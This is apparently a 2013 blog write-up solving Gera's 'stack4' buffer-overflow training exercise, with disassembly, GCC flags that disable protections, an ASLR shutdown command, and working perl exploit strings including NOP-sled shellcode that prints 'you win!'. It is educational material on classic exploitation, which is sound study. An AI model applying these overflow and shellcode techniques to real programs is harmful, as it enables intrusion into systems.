Gera's Warming Up on Stack #4 - Solutions
==========================================
date: 04/Jan/2013
summary: Solutions for Gera's Warming up on Stack #4 program.
tags: exploit, ctf

## Introduction

Following is the part 4 in the series of posts I started back in August 2012 with an aim to provide an analysis and possible solutions for the vulnerable programs provided by Gerardo 'gera' Richarte at the [Insecure Programming by example](http://pages.cs.wisc.edu/~riccardo/sec/) page.

This post follows the [Gera's Warming Up on Stack #3 - Solutions](/posts/20130103_geras-wuos-stack3-solutions.html) post and if you have not read it, I request you to please do so. Most of the concepts are very similar and since they have been already talked about, I'll not be reiterating them here.

Let's get started. Below is the source for the vulnerable [stack4.c](http://pages.cs.wisc.edu/~riccardo/sec/stack4.html) program:

```c
/* stack4.c                                     *
 * specially crafted to feed your brain by gera */

int main() {
    int cookie;
    char buf[80];

    printf("buf: %08x cookie: %08x\n", &buf, &cookie);
    gets(buf);

    if (cookie == 0x000a0d00)
        printf("you win!\n");
}
```

The above program too accepts user-input through the `gets` function and then looks for a specific value in a local variable named `cookie`. If this value is equal to a certain pre-defined constant, `printf` function is used to show a `you win!` message to the user. There is no direct means of modifying the content of the `cookie` variable. The `gets` function will keep reading from the stdin device until it encounters a newline or EoF character. Since this reading loop fails to honor the size of the destination buffer, a classic buffer overflow vulnerability is introduced in the program. Our aim is to leverage this vulnerability and exploit this program so that it print the `you win!` message to stdout.

Here are a few observations that could be made by looking at the source of the program:

- Since it is defined prior to buf, the `cookie` would be placed at a higher memory address on the program stack, just below the saved registers from the function prologue
- The `buf` character array would be at an offset of at least `80B` from `cookie`
- The `gets` call would accept unbounded user-input within `buf` array and hence it provides a mechanism to alter the call stack contents

Stack layout for [stack4.c](http://community.corest.com/%7Egera/InsecureProgramming/stack4.html) is identical to [stack1.c](http://community.corest.com/%7Egera/InsecureProgramming/stack1.html) as already outlined in the [Gera's Warming Up on Stack #1 - Solutions](/posts/20120827_geras-wuos-stack1-solutions.html) post.

Here are solutions I could think of to get the `you win!` message printed:

- [Solution #1: Overflow the internal `buf` array to overwrite EIP with the address of `printf(you win!)`](#solution1)
- [Solution #2: Inject a NOP-prefixed `printf(you win!)` shellcode and overwrite EIP with its address](#solution2)
- [Solution #3: Inject a NOP-prefixed `printf(you win!)` shellcode through an environment var and overwrite EIP with its address](#solution3)

Unlike earlier programs, where Solution #1 suggested overflowing the character array to overwrite `cookie` with desired value, [stack4.c](http://community.corest.com/%7Egera/InsecureProgramming/stack4.html) coud not be exploited in that manner. This is beacuse the `cookie` has been initialized with `0x000a0d00` and if we inject this string, the newline character (`0x0a`) will cause the `gets` internal read to stop processing further characters, thereby breaking our exploit. As such we won't be using this technqiue but rather use alternate methods.

Here's a brief description of the test system:

```
# cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
DISTRIB_DESCRIPTION=*Ubuntu 10.04.2 LTS*
Linux 2.6.38 i686 GNU/Linux
gcc (Ubuntu 4.4.3-4ubuntu5) 4.4.3
vendor_id   : GenuineIntel
model       : 37
model name  : Intel(R) Core(TM) i3 CPU       M 350  @ 2.27GHz
flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc up pni monitor ssse3 lahf_l
```

## Solutions
<a name="solution1"></a>
### Solution #1: Overflow the internal `buf` array to overwrite EIP with the address of `printf(you win!)`

Here's the GCC commandline to prepare [stack4.c](http://community.corest.com/%7Egera/InsecureProgramming/stack4.html) for this solution:

```
# gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack4 stack4.c
stack4.c: In function ‘main’:
stack4.c:9: warning: incompatible implicit declaration of built-in function ‘printf’
stack4.c:9: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 2 has type ‘char (*)[80]’
stack4.c:9: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 3 has type ‘int *’
/tmp/ccxoPw3D.o: In function `main':
stack4.c:(.text+0x27): warning: the `gets' function is dangerous and should not be used.
```

We need to have a look at the assembly of [stack4.c](http://community.corest.com/%7Egera/InsecureProgramming/stack4.html) and find out the location of the `printf` function which displays the `you win!` message:

```
# objdump -d -M intel stack4 | grep -A20 main.:
08048444 <main>:
 8048444:   55                      push   ebp
 8048445:   89 e5                   mov    ebp,esp
 8048447:   83 ec 60                sub    esp,0x60
 804844a:   8d 45 fc                lea    eax,[ebp-0x4]
 804844d:   89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 8048451:   8d 45 ac                lea    eax,[ebp-0x54]
 8048454:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048458:   c7 04 24 50 85 04 08    mov    DWORD PTR [esp],0x8048550
 804845f:   e8 0c ff ff ff          call   8048370 &lt;printf@plt&gt;
 8048464:   8d 45 ac                lea    eax,[ebp-0x54]
 8048467:   89 04 24                mov    DWORD PTR [esp],eax
 804846a:   e8 e1 fe ff ff          call   8048350 &lt;gets@plt&gt;
 804846f:   8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]
 8048472:   3d 00 0d 0a 00          cmp    eax,0xa0d00
 8048477:   75 0c                   jne    8048485 &lt;main+0x41&gt;
 8048479:   c7 04 24 68 85 04 08    mov    DWORD PTR [esp],0x8048568
 8048480:   e8 fb fe ff ff          call   8048380 &lt;puts@plt&gt;
 8048485:   c9                      leave
 8048486:   c3                      ret
 8048487:   90                      nop
```

The address turns out to be `0x8048479`. Let's try exploiting:

```
# perl -e 'print "A"x88 . "\x79\x84\x04\x08"' | ./stack4
buf: bfee4144 cookie: bfee4194
you win!
Segmentation fault
```

<a name="solution2"></a>
### Solution #2: Inject a NOP-prefixed `printf(you win!)` shellcode and overwrite EIP with its address

Let's first recompile [stack4.c](http://community.corest.com/%7Egera/InsecureProgramming/stack4.html) and request GCC to mark program stack as executable. Additionally, we also need to turn ASLR off so that we can have a static return address to overwrite EIP with:

```
# gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack4 stack4.c 2>/dev/null ; readelf -l stack4 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
#
# echo 0 >/proc/sys/kernel/randomize_va_space ; cat /proc/sys/kernel/randomize_va_space
0
```

Let's go ahead with exploitation. The Null-free, NOP-prefixed `printf(you win!)` shellcode we used to exploit [stack1.c](http://community.corest.com/%7Egera/InsecureProgramming/stack1.html) in the [Gera's Warming Up on Stack #1 - Solutions](https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html) post could be reused here:

```
# ./stack4
buf: bffff4c4 cookie: bffff514
#
# ./stack4
buf: bffff4c4 cookie: bffff514
#
# ./stack4
buf: bffff4c4 cookie: bffff514
#
# perl -e 'print "\x90"x51 . "\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21" . "\xc4\xf4\xff\xbf"' | ./stack4
buf: bffff4c4 cookie: bffff514
you win!#
```

<a name="solution3"></a>
### Solution #3: Inject a NOP-prefixed `printf(you win!)` shellcode through an environment var overwrite EIP with its address

Lets get straight to the exploitation:

```
# echo $WINCODE | hexdump -C
00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
00000020  20 77 69 6e 21 20 0d 0a                           | win! ..|
00000028
#
# ./getenvaddr WINCODE ./stack4
[+] WINCODE: 0xbffff726
#
# perl -e 'print "\x90"x88 . "\x26\xf7\xff\xbf"' | ./stack4
buf: bffff4c4 cookie: bffff514
you win!
```

So, we have now successfully exploited the [stack4.c](http://community.corest.com/%7Egera/InsecureProgramming/stack4.html) program through three different techniques. Depending on the motive of your exploitation attempt, other techniques could be devised and some, mentioned here, be rejected.

## Conclusion

Like I said, earlier, these solutions are not practical anymore. They just serve the purpose of understanding how exploits used to work before mitigation features were introduced in modern systems. But, as with everything else, understanding basics is really important. As mitigation features mature, exploitation techniques become increasingly complex. And to understand those, we need to build upon the solid foundation of basic concepts, like those discussed on this and other blogs.
